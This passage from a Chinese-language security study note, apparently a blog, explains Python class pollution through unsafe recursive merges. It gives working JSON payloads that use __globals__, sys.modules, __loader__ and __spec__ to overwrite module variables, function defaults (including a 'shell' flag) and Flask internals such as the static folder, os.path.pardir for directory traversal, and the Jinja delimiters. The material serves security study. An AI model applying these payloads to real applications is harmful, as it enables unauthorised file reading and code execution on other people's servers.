class="hljs-number">4</span>,<br>            <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-comment"># 声明的类也是一个全局属性</span><br>                <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-number">5</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="污染加载的其它模块"><a href="#污染加载的其它模块" class="headerlink" title="污染加载的其它模块"></a>污染加载的其它模块</h3><ul><li>在可以操控全局变量的情况下，我们能对入口文件的<em><strong>类对象或属性</strong></em>进行操作</li><li>如果目标对象不在入口文件中，就需要对其它加载过的模块来获取了</li></ul><h4 id="import加载污染"><a href="#import加载污染" class="headerlink" title="import加载污染"></a>import加载污染</h4><ul><li><code>import</code>入口文件同级下的目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> demo<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">##demo.py</span><br>a = <span class="hljs-number">1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>    classa = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="sys加载污染"><a href="#sys加载污染" class="headerlink" title="sys加载污染"></a>sys加载污染</h4><ul><li>引用第三方模块或内置模块的环境</li><li>这时候就要借助<code>sys</code>模块中的<code>module</code>属性<ul><li>该属性能加载出<em><strong>自运行开始所有已加载的模块</strong></em><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                        <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="加载器loader污染"><a href="#加载器loader污染" class="headerlink" title="加载器loader污染"></a>加载器loader污染</h4><ul><li><code>sys</code>模块不是都有导入的，这时候就能借助<code>loader</code></li><li><code>loader</code>加载器是python为了<strong>实现模块加载</strong>而设计的类，其在<code>importlilb</code>这一内置模块中有具体实现</li><li>且<code>importlib</code>模块下的所有<code>py</code>文件都引入了<code>sys</code>模块</li><li>这样就能通过<code>&lt;模块名&gt;.__loader__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 获取模块的loader</span><br>loader = math.__loader__<br><span class="hljs-comment"># 即 math 模块的 __loader__ 属性包含了一个 loader 对象，负责加载 math 模块</span><br><span class="hljs-comment"># 打印loader信息</span><br><span class="hljs-built_in">print</span>(loader)<br></code></pre></td></tr></table></figure></li></ul><h4 id="spec-污染"><a href="#spec-污染" class="headerlink" title="__spec__污染"></a><code>__spec__</code>污染</h4><ul><li>其包含了关于类加载时候的信息，定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</li><li>因此可以以<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块</li></ul><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><ul><li><code>__defaults__</code>：python中的一个内置元组，用于存储<strong>方法形参的默认参数值</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment">#(2, 3)</span><br></code></pre></td></tr></table></figure></li><li>因此可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span> : (<span class="hljs-literal">True</span>,)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><code>__kwdefaults__</code>是以字典形式来进行收录：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;shell&quot;</span> : <span class="hljs-literal">True</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="flask的app关键属性"><a href="#flask的app关键属性" class="headerlink" title="flask的app关键属性"></a>flask的app关键属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br><br><span class="hljs-comment"># _got_first_request:判断某次请求是否为flask启动后的第一次请求，返回布尔值，会影响装饰器:</span><br><span class="hljs-comment">## app.before_first_request 的调用</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># _static_url_path:被指定的static静态目录路径，污染后可实现重定向以获取其它文件下的信息</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 在 flask 应用下访问 GET /../XXX 一般都会报错500，在 temlating.py 模块下发生</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> INTERNAL SERVER ERROR<br><span class="hljs-comment">## 这是一个在模板渲染的时候为了防止目录穿梭进行的操作</span><br><span class="hljs-comment">## 使用 os.path.pairdir 来检验，其值为 .. </span><br><span class="hljs-comment">## 这个污染的是os模块下的吗？？？如果是的话为什么能污染到那？是因为是内置模块？</span><br><span class="hljs-comment">### 是因为 os 被 import 导入了</span><br><span class="hljs-comment">## 将其修改为任意值就能进行穿梭了</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># `Flask.jinja_env.variable_start_string = &quot;xxx&quot;`</span><br><span class="hljs-comment">## 实现对`Jinja`语法标识符进行替换，这里把 &#123;&#123; 换成了 [[</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;jinja_env&quot;</span> :&#123;<br><span class="hljs-string">&quot;variable_start_string&quot;</span> : <span class="hljs-string">&quot;[[&quot;</span>,<span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>&#125;        <br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">### 需要先污染再访问模板，因为会有缓存</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
